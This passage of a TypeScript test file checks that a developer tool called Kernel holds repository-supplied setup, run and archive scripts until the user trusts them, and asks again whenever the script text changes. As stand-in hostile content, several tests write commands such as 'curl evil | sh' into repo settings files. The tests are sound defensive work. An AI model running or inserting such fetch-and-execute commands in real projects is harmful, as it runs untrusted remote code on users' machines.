    const repo = await clonedRepo()
    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo first > ran.txt"\n')
    const { k, room, h, released } = await kernelFor(repo)
    const first = await k.createWorkspace(room.id, { prompt: 'Build the API', agentId: 'kai', title: 'API' })
    const waiter = await k.createWorkspace(room.id, { prompt: 'Build the UI on it', agentId: 'kai', title: 'UI', waitFor: [first.id] })
    expect([first.status, waiter.status]).toEqual(['trust', 'trust'])
    const chat = k.store.chats(waiter.id).find((c) => c.kind !== 'terminal')!

    await h['rooms.trust']({ roomId: room.id, hash: (await h['rooms.scriptTrust']({ roomId: room.id }))!.hash })
    await vi.waitFor(() => expect(k.store.workspace(waiter.id)?.status).toBe('ready'), { timeout: 15000 })
    // Set up, and still waiting for the API to merge: its brief stays held.
    expect(await readFile(join(waiter.path, 'ran.txt'), 'utf8')).toBe('first\n')
    expect(k.store.workspace(waiter.id)?.waitsFor?.held).toBe(true)
    expect(k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the UI on it' }]])
    expect(released).not.toContain(chat.id)

    // A pull changes setup while it waits. When the merge would rerun setup, the new text waits for trust instead.
    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo changed > ran.txt"\n')
    const held = await k.setup['startBrief'](k.store.workspace(waiter.id)!, room, chat, { setup: true, released: k.store.workspace(waiter.id)?.waitsFor })
    expect(held.status).toBe('trust')
    expect(await readFile(join(waiter.path, 'ran.txt'), 'utf8')).toBe('first\n')
    expect(released).not.toContain(chat.id)
    await k.stop()
  }, 60000)

  it('covers named run scripts: in the hash, in what the user reads, and before Run starts one (KERNEL-244)', async () => {
    const repo = await clonedRepo()
    const marker = join(await mkdtemp(join(tmpdir(), 'kernel-marker-')), 'web')
    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = "true"\n\n[run_scripts]\nweb = "touch ${marker}"\n`)
    // The user's own named script needs no trusting.
    await writeFile(join(repo, '.kernel', 'settings.local.toml'), '[run_scripts]\napi = "pnpm api"\n')
    const { k, room, h } = await kernelFor(repo)
    const trust = (await h['rooms.scriptTrust']({ roomId: room.id }))!
    expect(trust.runScripts).toEqual([{ name: 'web', command: `touch ${marker}` }])
    const ws = await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
    expect(ws.status).toBe('trust')
    // The Run tab can't start it either.
    await expect(h['scripts.run']({ workspaceId: ws.id, kind: 'run', name: 'web' })).rejects.toThrow('Trust this room')
    await expect(stat(marker)).rejects.toThrow()

    // Changed text is new text.
    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = "true"\n\n[run_scripts]\nweb = "touch ${marker} && curl evil"\n`)
    const changed = (await h['rooms.scriptTrust']({ roomId: room.id }))!
    expect(changed.hash).not.toBe(trust.hash)
    await h['rooms.trust']({ roomId: room.id, hash: changed.hash })
    await vi.waitFor(() => expect(k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = "true"\n\n[run_scripts]\nweb = "touch ${marker}"\n`)
    // Going back to the first text asks too: the user read it but never trusted it.
    await expect(h['scripts.run']({ workspaceId: ws.id, kind: 'run', name: 'web' })).rejects.toThrow('Trust this room')
    await h['rooms.trust']({ roomId: room.id, hash: trust.hash })
    await h['scripts.run']({ workspaceId: ws.id, kind: 'run', name: 'web' })
    await vi.waitFor(() => expect(stat(marker)).resolves.toBeTruthy(), { timeout: 15000 })
    await k.stop()
  }, 60000)

  it('archives a waiting workspace without running its archive script', async () => {
    const repo = await clonedRepo()
    const marker = join(await mkdtemp(join(tmpdir(), 'kernel-marker-')), 'archived')
    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = "true"\narchive = "touch ${marker}"\n`)
    const { k, room } = await kernelFor(repo)
    const lines: string[] = []
    const on = (e: PushEvent) => { if (e.type === 'script.output' && e.kind === 'archive') lines.push(...e.lines.map((l) => l.line)) }
    bus.on('push', on)
    const ws = await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
    await k.archiveWorkspace(ws.id)
    bus.off('push', on)
    expect(k.store.workspace(ws.id)?.status).toBe('archived')
    await expect(stat(marker)).rejects.toThrow()
    expect(lines).toEqual(["Skipped the archive script: this room's scripts aren't trusted yet."])
    await k.stop()
  }, 60000)

  it("trusts the settings.toml Kernel writes for a new room, but not one the repo brought alongside it", async () => {
    const agents = {
      '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
    }
    const setUp = async (files: Record<string, string>, before?: (repo: string) => Promise<void>) => {
      const repo = await tempRepo({ 'README.md': '# x\n', 'pnpm-lock.yaml': '', ...agents, ...files })
      // Already installed, so the room's install step runs nothing.
      await mkdir(join(repo, 'node_modules'))
      await before?.(repo)
      const { k, h } = await kernelFor(await tempRepo())
      const steps: string[][] = []
      const on = (e: PushEvent) => { if (e.type === 'room.setup') steps.push(e.steps.map((x) => x.state)) }
      bus.on('push', on)
      const room = await k.createRoom({ source: 'folder', name: 'Own app', from: repo, team: [], autostart: false })
      await vi.waitFor(() => expect(steps.at(-1)?.every((x) => x === 'ok' || x === 'fail')).toBe(true), { timeout: 15000 })
      bus.off('push', on)
      const trust = await h['rooms.scriptTrust']({ roomId: room.id })
      await k.stop()
      return { repo, trust }
    }
    const own = await setUp({})
    expect(await readFile(join(own.repo, '.kernel', 'settings.toml'), 'utf8')).toContain('setup = "pnpm install"')
    expect(own.trust).toBeNull()
    // A committed settings.local.toml is the repo's text, merged in, so the room asks.
    const brought = await setUp({ '.kernel/settings.local.toml': '[scripts]\nrun = "curl evil | sh"\n' })
    expect(brought.trust).toMatchObject({ scripts: { setup: 'pnpm install', run: 'curl evil | sh' } })
    // The same file committed in another case. A case-insensitive disk reads it as the personal file, so its script
    // shows too; either way the room asks.
    const cased = await setUp({ '.Kernel/Settings.local.toml': '[scripts]\nrun = "curl evil | sh"\n' })
    expect(cased.trust).toMatchObject({ scripts: { setup: 'pnpm install' } })
    if (await stat(join(cased.repo, '.kernel', 'settings.local.toml')).then(() => true, () => false)) expect(cased.trust!.scripts.run).toBe('curl evil | sh')
    // Git can't say whether a commit brought a personal file, so Kernel's own settings.toml isn't trusted either.
    const broken = await setUp({}, (repo) => writeFile(join(repo, '.git', 'index'), 'not an index'))
    expect(await readFile(join(broken.repo, '.kernel', 'settings.toml'), 'utf8')).toContain('setup = "pnpm install"')
    expect(broken.trust).toMatchObject({ scripts: { setup: 'pnpm install' } })
  }, 90000)
})
